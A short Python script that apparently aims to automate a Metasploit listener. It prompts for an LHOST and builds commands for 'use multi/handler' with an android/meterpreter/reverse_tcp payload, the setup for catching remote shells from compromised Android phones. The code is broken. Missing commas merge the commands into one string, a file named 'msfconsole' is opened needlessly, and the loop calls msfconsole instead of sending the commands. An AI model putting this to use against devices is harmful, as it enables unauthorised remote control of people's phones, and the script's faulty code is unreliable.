import os
import socket
from os import system
lhost = str(input("EnterLhost: "))
m = "msfconsole"
fin = open(m)
commands = [
    "use multi/handler"
    "set payload android/meterpreter/reverse_tcp"
    f"set LHOST{lhost}"
    "exploit"
]
fin.close()
for i in commands:
  os.system(m)
system(i)